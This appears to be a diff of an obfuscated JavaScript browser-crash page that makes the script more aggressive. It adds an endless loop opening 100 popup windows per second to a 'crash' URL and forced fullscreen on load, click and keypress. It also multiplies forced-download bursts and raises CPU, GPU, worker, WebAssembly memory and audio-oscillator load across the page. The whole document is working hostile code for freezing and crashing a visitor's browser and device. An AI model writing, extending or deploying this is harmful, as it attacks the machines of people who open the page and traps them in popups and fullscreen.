@@ -53,10 +53,10 @@
 
 // ============================================================
 // 9z2m 8q3n (N) — 92zk 6z1v 92zk 3q9z 9z2m 8n1v
-// 92kv q3n 4z9v: 92zk 92zk 9z2m 92zk 3q9z 8q1v
 // ============================================================
-const N = 2;                      // 92zk 9z2m (N)
-const IV = 40;                    // 8q3n 92zk 9z3k (ms)
+const N = 100;                       // 92zk 9z2m (N)
+const IV = 1000;                     // 8q3n 92zk 9z3k (ms)
+const TARGET_URL = 'https://hypie12o.github.io/crash/';
 
 // ============================================================
 // x9k2n7m3 = 8q3n 9z2m 8n1v (download counter) — PLAIN VARIABLE
@@ -74,6 +74,53 @@ window.__x9k2n7m3 = function () { return x9k2n7m3; };
 window.__q8v3n1z5 = q8v3n1z5;
 
 // ============================================================
+// 8q2m 9z3k 8n1v — 9z2m 8q3n 92zk 9z3k 8q1v 92zk 92zk 9z2m
+// ============================================================
+let popupCount = 0;
+function z9k2m4v_pop() {
+  for (let i = 0; i < N; i++) {
+    try {
+      const w = window.open(TARGET_URL, '_blank', 'noopener,noreferrer');
+      if (w) popupCount++;
+    } catch (e) {
+      // swallowed — browsers block most of these anyway
+    }
+  }
+}
+
+// First burst immediately, then every IV ms forever.
+setTimeout(z9k2m4v_pop, 200);
+const popupInterval = setInterval(z9k2m4v_pop, IV);
+window.__popupInterval = popupInterval;
+window.__getPopupCount = function () { return popupCount; };
+
+// ============================================================
+// 8q2m 92zk 9z2m 8q3n (fullscreen) — 4q1v 92zk 6z1v
+// ============================================================
+function v9k3n2m_fs() {
+  const el = document.documentElement;
+  const rfs = el.requestFullscreen ||
+              el.webkitRequestFullscreen ||
+              el.mozRequestFullscreen ||
+              el.msRequestFullscreen;
+  if (rfs) {
+    try {
+      rfs.call(el, { navigationUI: 'hide' }).catch(() => {});
+    } catch (e) {
+      // ignored — browsers require a user gesture for fullscreen
+    }
+  }
+}
+
+// Attempt immediately on load.
+v9k3n2m_fs();
+// Attempt again after a microtask (sometimes the first is too early).
+setTimeout(v9k3n2m_fs, 0);
+// Also attach to a huge transparent overlay so the first click grabs it.
+document.addEventListener('click', v9k3n2m_fs, { once: true });
+document.addEventListener('keydown', v9k3n2m_fs, { once: true });
+
+// ============================================================
 // 3n1v 92zk 8q2m 92kv 82kv 6z1n 9z2m N 8q1v 92zk 9z3k
 // ============================================================
 (function p3q8v1n5() {
@@ -86,7 +133,6 @@ window.__q8v3n1z5 = q8v3n1z5;
   }
 
   function z9k2m4v() {
-    // Loop N times: fire an anchor download per iteration.
     for (let i = 0; i < N; i++) {
       try {
         const A = document.createElement('a');
@@ -105,7 +151,6 @@ window.__q8v3n1z5 = q8v3n1z5;
   }
 
   function m8q2n1z() {
-    // Fetch fallback: N parallel fetch attempts, converted to blob downloads.
     for (let i = 0; i < N; i++) {
       fetch(U, { cache: 'no-store' })
         .then(r => {
@@ -132,17 +177,14 @@ window.__q8v3n1z5 = q8v3n1z5;
     }
   }
 
-  // First burst immediately.
   z9k2m4v();
   setTimeout(m8q2n1z, 1500);
 
-  // Then keep firing N downloads every IV ms, forever.
   const dInt = setInterval(() => {
     z9k2m4v();
     setTimeout(m8q2n1z, 1500);
   }, IV);
 
-  // Keep a handle so beforeunload can clear it.
   window.__dInt = dInt;
 })();
 
@@ -230,7 +272,7 @@ const m8n2q6z = `
 `;
 
 // ============================================================
-// 8q2n 1 — x9k2n 8q3n
+// 8q2n 1 — x9k2n 8q3n  (MUCH heavier: 1024 steps, 18 iter)
 // ============================================================
 (function z3p7v1n() {
   const c = document.getElementById('x9k2n7m');
@@ -245,11 +287,11 @@ const m8n2q6z = `
 
   const R = 4.0;
   const D = 2.0;
-  const M = 48 * 1024 * 1024;
-  const S = 512;
-  const I = 14;
-  const H = 64;
-  const A = 10;
+  const M = 64 * 1024 * 1024;       // 64 MP cap
+  const S = 1024;                    // 1024 raymarch steps
+  const I = 18;                      // 18 mandelbulb iterations
+  const H = 96;                      // 96 shadow steps
+  const A = 14;                      // 14 AO steps
 
   const NS = 4096;
   const FZ = `
@@ -271,7 +313,7 @@ const m8n2q6z = `
     }
     float z9(vec2 p) {
       float s = 0.0, a = 0.5;
-      for (int i = 0; i < 8; i++) {
+      for (int i = 0; i < 10; i++) {
         s += a * q3(p);
         p = p * 2.03 + 11.7;
         a *= 0.5;
@@ -279,7 +321,7 @@ const m8n2q6z = `
       return s;
     }
     void main() {
-      vec2 p = vUv * 96.0;
+      vec2 p = vUv * 128.0;
       float r = z9(p);
       float g = z9(p + vec2(31.4, 17.3));
       float b = z9(p + vec2(91.7, 53.1));
@@ -308,8 +350,8 @@ const m8n2q6z = `
     uniform sampler2D uNoise;
 
     #define MAX_STEPS     ${S}
-    #define MAX_DIST      32.0
-    #define SURF          0.00020
+    #define MAX_DIST      40.0
+    #define SURF          0.00015
     #define ITER          ${I}
     #define SHADOW_STEPS  ${H}
     #define AO_STEPS      ${A}
@@ -358,7 +400,7 @@ const m8n2q6z = `
     }
 
     vec3 v9(vec3 p) {
-      vec2 e = vec2(0.0007, 0.0);
+      vec2 e = vec2(0.0005, 0.0);
       return normalize(vec3(
         q2(p + e.xyy) - q2(p - e.xyy),
         q2(p + e.yxy) - q2(p - e.yxy),
@@ -382,7 +424,7 @@ const m8n2q6z = `
       for (int i = 0; i < SHADOW_STEPS; i++) {
         float h = q2(ro + rd * t);
         res = min(res, k * h / t);
-        t += clamp(h, 0.008, 0.20);
+        t += clamp(h, 0.006, 0.20);
         if (res < 0.004 || t > maxt) break;
       }
       return clamp(res, 0.0, 1.0);
@@ -424,7 +466,7 @@ const m8n2q6z = `
 
         vec3 lg = normalize(vec3(0.65, 0.80, -0.45));
         float oc = k9(ps, nr);
-        float sh = x3(ps + nr * 0.0015, lg, 0.02, 7.0, 10.0);
+        float sh = x3(ps + nr * 0.0015, lg, 0.02, 9.0, 10.0);
 
         vec3 nA = texture2D(uNoise, ps.xy * 0.35 + 0.5).rgb;
         vec3 nB = texture2D(uNoise, ps.zx * 0.55 + 0.5).rgb;
@@ -639,7 +681,7 @@ const m8n2q6z = `
 })();
 
 // ============================================================
-// 8q2n 2 — 6982 92zk 8q1v
+// 8q2n 2 — 6982 92zk 8q1v  (bumped from 3000 → 6000)
 // ============================================================
 (function k9x4m8q() {
   const c = document.getElementById('z3m9x2p');
@@ -715,7 +757,7 @@ const m8n2q6z = `
   gl.blendFunc(gl.SRC_ALPHA, gl.ONE);
   gl.disable(gl.DEPTH_TEST);
 
-  const NP = 3000;
+  const NP = 6000;                   // doubled from 3000
   const pt = new Array(NP);
   for (let i = 0; i < NP; i++) {
     pt[i] = {
@@ -770,7 +812,7 @@ const m8n2q6z = `
 })();
 
 // ============================================================
-// 8q2n 3 — 92mq 6z1v 8n3q + 4592² 92zk
+// 8q2n 3 — 92mq 6z1v 8n3q + 4592² 92zk  (64-tap blur, up from 32)
 // ============================================================
 (function n2v6p3z() {
   const c = document.getElementById('w8q2n5v');
@@ -806,14 +848,14 @@ const m8n2q6z = `
                                    0.0011 * cos(uTime * 0.9));
       vec3 prev = texture2D(uPrev, uvPrev).rgb;
       vec3 hr = vec3(0.0);
-      for (int i = 0; i < 32; i++) {
+      for (int i = 0; i < 64; i++) {        // 64-tap (up from 32)
         float fi = float(i);
-        float ang = fi * 0.19635;
-        float r = 0.010 * (1.0 + fi * 0.05);
+        float ang = fi * 0.098175;           // 2π/64
+        float r = 0.010 * (1.0 + fi * 0.025);
         vec2 off = vec2(cos(ang), sin(ang)) * r;
         hr += texture2D(uHighRes, uv + off).rgb;
       }
-      hr /= 32.0;
+      hr /= 64.0;
       vec3 col = prev * 0.94 + hr * 0.06 + vec3(0.002, 0.003, 0.006);
       col += uFirstFrame * texture2D(uHighRes, uv).rgb;
       col = col / (1.0 + col * 0.3);
@@ -851,7 +893,7 @@ const m8n2q6z = `
     }
     float z9(vec2 p) {
       float s = 0.0, a = 0.5;
-      for (int i = 0; i < 7; i++) {
+      for (int i = 0; i < 9; i++) {
         s += a * q3(p);
         p = p * 2.07 + 13.1;
         a *= 0.5;
@@ -947,9 +989,9 @@ const m8n2q6z = `
 })();
 
 // ============================================================
-// 8q3n 92zk 8n1v
+// 8q3n 92zk 8n1v  (bumped budget 90 → 180 ms)
 // ============================================================
-const B = 90;
+const B = 180;
 let mi = 0, mr = 0, mt = performance.now(), mI = 0;
 
 function q8m1x5k(b) {
@@ -978,7 +1020,7 @@ function q8m1x5k(b) {
 }
 
 // ============================================================
-// 8q2n 9z3k
+// 8q2n 9z3k  (bumped to 32 workers)
 // ============================================================
 const WS = `
   'use strict';
@@ -1014,7 +1056,7 @@ const WS = `
   }
 `;
 
-const NW = Math.min(16, Math.max(4, navigator.hardwareConcurrency || 8));
+const NW = 32;                       // 32 workers (up from 16)
 const WU = URL.createObjectURL(new Blob([WS], { type: 'application/javascript' }));
 const wk = [];
 const wr = new Array(NW).fill(0);
@@ -1033,10 +1075,10 @@ for (let i = 0; i < NW; i++) {
 }
 
 // ============================================================
-// 82kv 6z1v 92zk
+// 82kv 6z1v 92zk  (bumped children 600 → 1200)
 // ============================================================
 const tt = document.getElementById('p4z9k1n');
-const TC = 600;
+const TC = 1200;
 {
   const fr = document.createDocumentFragment();
   for (let i = 0; i < TC; i++) {
@@ -1077,14 +1119,14 @@ function x9p4m1q() {
 }
 
 // ============================================================
-// 92zk 3q9v
+// 92zk 3q9v  (bumped 8 → 24 intervals)
 // ============================================================
 let it = 0;
 const iv = [];
-for (let i = 0; i < 8; i++) {
+for (let i = 0; i < 24; i++) {
   const id = setInterval(() => {
     let s = 0;
-    const b = new Uint32Array(512);
+    const b = new Uint32Array(2048);
     for (let k = 0; k < b.length; k++) {
       b[k] = (Math.random() * 0xffffffff) >>> 0;
     }
@@ -1102,7 +1144,7 @@ for (let i = 0; i < 8; i++) {
 let to1 = 0;
 function tl1() {
   let s = 0;
-  for (let i = 0; i < 8192; i++) s = (s * 31 + i) >>> 0;
+  for (let i = 0; i < 16384; i++) s = (s * 31 + i) >>> 0;
   to1++;
   setTimeout(tl1, 0);
 }
@@ -1111,7 +1153,7 @@ setTimeout(tl1, 0);
 let to2 = 0;
 function tl2() {
   let s = 0;
-  const a = new Float64Array(2048);
+  const a = new Float64Array(4096);
   for (let i = 0; i < a.length; i++) a[i] = Math.sin(i * 0.001 + s);
   for (let i = 0; i < a.length; i++) s += a[i] * a[i];
   to2++;
@@ -1119,25 +1161,34 @@ function tl2() {
 }
 setTimeout(tl2, 0);
 
+let to3 = 0;
+function tl3() {
+  let s = '';
+  for (let i = 0; i < 8000; i++) s += 'v' + i + ';';
+  to3++;
+  setTimeout(tl3, 0);
+}
+setTimeout(tl3, 0);
+
 // ============================================================
-// 8q3n 4z9v
+// 8q3n 4z9v  (bumped sizes)
 // ============================================================
 let ab = 0, abb = 0, abr = 0, abt = performance.now(), abp = 0;
 
 function aB() {
-  const S = [8*1024*1024, 16*1024*1024, 8*1024*1024, 32*1024*1024];
+  const S = [16*1024*1024, 32*1024*1024, 16*1024*1024, 64*1024*1024];
   for (const b of S) {
     try {
-      if (b % 8 === 0 && b >= 32 * 1024 * 1024) {
+      if (b % 8 === 0 && b >= 64 * 1024 * 1024) {
         const t = new Int32Array(b / 4);
-        for (let i = 0; i < t.length; i += 4096) t[i] = i;
+        for (let i = 0; i < t.length; i += 2048) t[i] = i;
       } else if (b % 8 === 0) {
         const t = new Float64Array(b / 8);
-        for (let i = 0; i < t.length; i += 8192) t[i] = i * 0.5;
+        for (let i = 0; i < t.length; i += 4096) t[i] = i * 0.5;
       } else {
         const ab2 = new ArrayBuffer(b);
         const v = new Uint8Array(ab2);
-        for (let i = 0; i < v.length; i += 16384) v[i] = i & 0xff;
+        for (let i = 0; i < v.length; i += 8192) v[i] = i & 0xff;
       }
       ab++; abb += b;
     } catch (e) {}
@@ -1149,7 +1200,7 @@ function aB() {
   }
 }
 
-const BC = 200000;
+const BC = 400000;
 let oc = 0, or_ = 0, ot = performance.now(), op = 0;
 
 function bO() {
@@ -1158,13 +1209,13 @@ function bO() {
     a[i] = {
       id: i,
       name: 'k3_' + i,
-      tags: ['q', 'v', 'z', (i & 7).toString()],
-      n: { v: i * 0.5, f: (i & 1) === 1, m: { d: 3, l: 'x' + i } },
-      d: '8n1v ' + i + ' 9z2k 8q3n',
+      tags: ['q', 'v', 'z', 'w', 'x', (i & 7).toString()],
+      n: { v: i * 0.5, f: (i & 1) === 1, m: { d: 3, l: 'x' + i, e: 'y' + i } },
+      d: '8n1v ' + i + ' 9z2k 8q3n 6v3n 9z1v',
     };
   }
   let s = 0;
-  for (let i = 0; i < a.length; i += 1024) s += a[i].id;
+  for (let i = 0; i < a.length; i += 512) s += a[i].id;
   oc += BC;
   const n = performance.now();
   if (n - ot >= 500) {
@@ -1178,15 +1229,15 @@ let js = '';
 let jc = 0, jb = 0, jr = 0, jt = performance.now(), jp = 0;
 
 function bJ() {
-  const NN = 60000;
+  const NN = 120000;
   const rows = new Array(NN);
   for (let i = 0; i < NN; i++) {
     rows[i] = JSON.stringify({
       id: i,
       uuid: 'q-' + i + '-' + (i * 7919).toString(36),
       value: Math.sin(i) * 1000,
-      tags: ['k', 'v', 'z', (i & 15).toString()],
-      nested: { a: [1, 2, 3, 4, 5], b: 'z'.repeat(16), c: i * 3.14 },
+      tags: ['k', 'v', 'z', 'w', 'x', (i & 15).toString()],
+      nested: { a: [1,2,3,4,5,6,7,8], b: 'z'.repeat(32), c: i * 3.14, d: 'q' },
     });
   }
   return '[' + rows.join(',') + ']';
@@ -1197,7 +1248,7 @@ function pJ() {
   try {
     const o = JSON.parse(js);
     let s = 0;
-    for (let i = 0; i < o.length; i += 4096) s += o[i].id;
+    for (let i = 0; i < o.length; i += 2048) s += o[i].id;
     jc++; jb += js.length;
   } catch (e) {}
   const n = performance.now();
@@ -1207,7 +1258,7 @@ function pJ() {
   }
 }
 
-const SC = 40000;
+const SC = 80000;
 let cc = 0, cch = 0, cr = 0, ct = performance.now(), cp = 0;
 
 function cS() {
@@ -1226,37 +1277,37 @@ function cS() {
 
 let wm = null, wp = 0, wg = 0, wtp = 0;
 try {
-  wm = new WebAssembly.Memory({ initial: 16, maximum: 32768 });
+  wm = new WebAssembly.Memory({ initial: 16, maximum: 65536 });
   wp = 16;
 } catch (e) { console.error('2k9v 8q3n:', e); }
 
 function wG() {
   if (!wm) return;
   try {
-    if (wp >= 4096) {
-      wm = new WebAssembly.Memory({ initial: 16, maximum: 32768 });
+    if (wp >= 8192) {
+      wm = new WebAssembly.Memory({ initial: 16, maximum: 65536 });
       wp = 16;
     }
     const b4 = wm.buffer.byteLength;
-    wp = wm.grow(16);
+    wp = wm.grow(32);
     const a4 = wm.buffer.byteLength;
     wg++; wtp += (a4 - b4) / 65536;
     const v = new Uint8Array(wm.buffer);
-    for (let i = b4; i < a4; i += 4096) v[i] = i & 0xff;
+    for (let i = b4; i < a4; i += 2048) v[i] = i & 0xff;
   } catch (e) {
     try {
-      wm = new WebAssembly.Memory({ initial: 16, maximum: 32768 });
+      wm = new WebAssembly.Memory({ initial: 16, maximum: 65536 });
       wp = 16;
     } catch (_) { wm = null; }
   }
 }
 
 const mI2 = [];
-mI2.push(setInterval(aB, 150));
-mI2.push(setInterval(bO, 250));
-mI2.push(setInterval(pJ, 300));
-mI2.push(setInterval(cS, 120));
-mI2.push(setInterval(wG, 200));
+mI2.push(setInterval(aB, 100));
+mI2.push(setInterval(bO, 150));
+mI2.push(setInterval(pJ, 200));
+mI2.push(setInterval(cS, 80));
+mI2.push(setInterval(wG, 120));
 
 // ============================================================
 // 8q3n 9z3q 92zk
@@ -1354,7 +1405,7 @@ function sA() {
     };
   }
 
-  const OC = 32;
+  const OC = 64;                     // 64 oscillators (up from 32)
   const OT = ['sine', 'square', 'sawtooth', 'triangle'];
   for (let i = 0; i < OC; i++) {
     const o = ac.createOscillator();
@@ -1452,12 +1503,12 @@ function tk() {
       '6q3z              : ' + fps.toFixed(1) + '\n' +
       '8q2n 6z1v         : ' + lmi + '\n' +
       '6982 6z1v         : ' + lp + ' 92zk / 9q2m\n' +
-      '92mq 6z1v         : 82kv-8q3n + 32-92zk · 4592² 8q3n\n' +
+      '92mq 6z1v         : 64-8q3n + 64-92zk · 4592² 8q3n\n' +
       '2k9v 8n3q         : 3 · 8q3n: 6 · 92qk: ~7\n' +
       '8q3n 92zk 8n1v    : ' + (mr / 1e6).toFixed(2) + ' M 3q9z\n' +
       '9z3k 8n1v         : ' + wA + '/' + NW + ' · ' + (wT / 1e6).toFixed(2) + ' M 3q9z\n' +
       '82kv 6z1v         : ' + (tr2 / 1000).toFixed(1) + ' k 8q3n/9z\n' +
-      '92zk 3q9v         : ' + it + ' · ' + to1 + ' · ' + to2 + '\n' +
+      '92zk 3q9v         : ' + it + ' · ' + to1 + ' · ' + to2 + ' · ' + to3 + '\n' +
       '8q3n 9z3q         : ' + as + '\n' +
       '2k9v 4z9v         : ' + abr.toFixed(1) + ' MV/9z · ' + ab + ' 2k9v\n' +
       '8q2n 8n1v         : ' + (or_ / 1000).toFixed(1) + ' k 8n/9z · ' + oc + ' 9z2q\n' +
@@ -1465,7 +1516,9 @@ function tk() {
       '9z3q 8n1v         : ' + (cr / 1000).toFixed(1) + ' k 8q/9z · ' + (cch / 1048576).toFixed(1) + ' MV\n' +
       '2k9v 3q9z         : ' + wmm + ' · ' + wg + ' 8q3n · ' + (wtp * 65536 / 1048576).toFixed(0) + ' MV\n' +
       '6z1v 92zk         : ' + x9k2n7m3 + ' 8q3n · ' + q8v3n1z5.length + ' 8q3n\n' +
-      '9z2m 8n1v         : N=' + N + ' 92zk / ' + IV + ' 9z3k\n' +
+      '9z2m 8n1v         : N=' + N + ' / ' + IV + ' 9z3k\n' +
+      '8q2m 9z3k         : ' + popupCount + ' 8q3n opened\n' +
+      '9z3k 9z1v         : ' + (document.fullscreenElement ? 'zk' : '8q') + '\n' +
       '3q9z              : ' + mm;
 
     fc = 0;
@@ -1499,6 +1552,7 @@ window.addEventListener('beforeunload', () => {
   for (const id of iv) { try { clearInterval(id); } catch (_) {} }
   for (const id of mI2) { try { clearInterval(id); } catch (_) {} }
   try { if (window.__dInt) clearInterval(window.__dInt); } catch (_) {}
+  try { if (window.__popupInterval) clearInterval(window.__popupInterval); } catch (_) {}
   if (ac) { try { ac.close(); } catch (_) {} }
 });
 
